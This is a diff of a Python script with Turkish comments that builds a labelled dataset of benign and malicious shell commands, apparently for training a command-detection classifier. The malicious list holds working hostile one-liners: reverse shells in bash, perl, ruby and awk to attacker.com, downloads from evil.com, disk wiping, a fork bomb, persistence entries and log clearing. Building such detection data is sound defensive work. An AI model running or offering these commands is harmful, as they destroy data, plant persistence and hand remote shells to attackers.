@@ -1,10 +1,11 @@
+
 import pandas as pd
 import random
 
 def generate_dataset(size=10000):
+    """Gelişmiş veri seti üretici - 10000 girdi"""
     
-
-    
+   
     benign_templates = [
         "ls -la", "pwd", "whoami", "date", "uptime", "ps aux", "df -h", "free -m",
         "cat /etc/passwd", "grep pattern file.txt", "find /home -name '*.txt'",
@@ -28,17 +29,7 @@ def generate_dataset(size=10000):
         "id user", "groups user", "last", "w", "who", "finger user",
         "passwd user", "useradd newuser", "usermod -aG sudo user", "userdel olduser"
     ]
-
-   
-    graylist_commands = [
-        "regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll",
-        "csc -target:library file.cs",
-        "powershell Get-Process",
-        "msbuild project.csproj",
-        "certutil -hashfile file.txt SHA256"
-    ]
-    benign_templates.extend(graylist_commands)
-
+    
     
     malicious_templates = [
         "rm -rf /", ":(){ :|:& };:", "dd if=/dev/zero of=/dev/sda",
@@ -47,13 +38,11 @@ def generate_dataset(size=10000):
         "cat /dev/urandom > /dev/sda", "chmod 777 /etc/shadow",
         "nc -l -p 4444 -e /bin/bash", "python -c 'import os; os.system(\"rm -rf /\")'",
         "powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=", "cmd /c del /q /s C:\\*",
-        "vssadmin delete shadows /all /quiet",
-        "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+        "vssadmin delete shadows /all /quiet", "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
         "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /d C:\\malware.exe",
         "schtasks /create /tn 'evil' /tr 'C:\\malware.exe' /sc onlogon",
         "net user hacker password123 /add", "net localgroup administrators hacker /add",
-        "attrib +h +s malware.exe",
-        "copy malware.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
+        "attrib +h +s malware.exe", "copy malware.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
         "wmic process call create 'cmd.exe /c powershell.exe'",
         "certutil -urlcache -split -f http://evil.com/malware.exe malware.exe",
         "bitsadmin /transfer myDownload http://evil.com/payload.exe C:\\payload.exe",
@@ -66,17 +55,19 @@ def generate_dataset(size=10000):
         "taskkill /f /im antimalware.exe", "wevtutil cl Security", "wevtutil cl System",
         "cipher /w:C:\\", "sdelete -p 10 -s -z C:\\", "format C: /q /x",
         "diskpart select disk 0 clean", "shutdown /r /f /t 0",
-        "ncat -lvp 443 -e cmd.exe", "socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",
-        "bash -i >& /dev/tcp/attacker.com/443 0>&1",
+        "python -m http.server 8080", "ncat -lvp 443 -e cmd.exe",
+        "socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash", "bash -i >& /dev/tcp/attacker.com/443 0>&1",
         "perl -e 'use Socket;$i=\"attacker.com\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
-        "ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",443).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+        "ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",443).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "awk 'BEGIN {s = \"/inet/tcp/0/attacker.com/443\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
     ]
-
-    data = []
-
     
-    for _ in range(size // 2):
+    data = []
+    
+   
+    for i in range(size // 2):
         cmd = random.choice(benign_templates)
+       
         if random.random() < 0.3:
             variations = [
                 f"{cmd} --help",
@@ -87,11 +78,13 @@ def generate_dataset(size=10000):
                 f"{cmd} 2>/dev/null"
             ]
             cmd = random.choice(variations)
+        
         data.append({"command": cmd, "label": "benign"})
-
     
-    for _ in range(size // 2):
+ 
+    for i in range(size // 2):
         cmd = random.choice(malicious_templates)
+        
         if random.random() < 0.3:
             variations = [
                 f"{cmd} &",
@@ -102,8 +95,10 @@ def generate_dataset(size=10000):
                 f"({cmd})"
             ]
             cmd = random.choice(variations)
+            
         data.append({"command": cmd, "label": "malicious"})
-
+    
+    
     random.shuffle(data)
     df = pd.DataFrame(data)
     return df
@@ -115,3 +110,4 @@ if __name__ == '__main__':
     print(f"Veri seti başarıyla oluşturuldu: {len(dataset)} girdi")
     print(f"Benign: {len(dataset[dataset['label'] == 'benign'])}")
     print(f"Malicious: {len(dataset[dataset['label'] == 'malicious'])}")
+
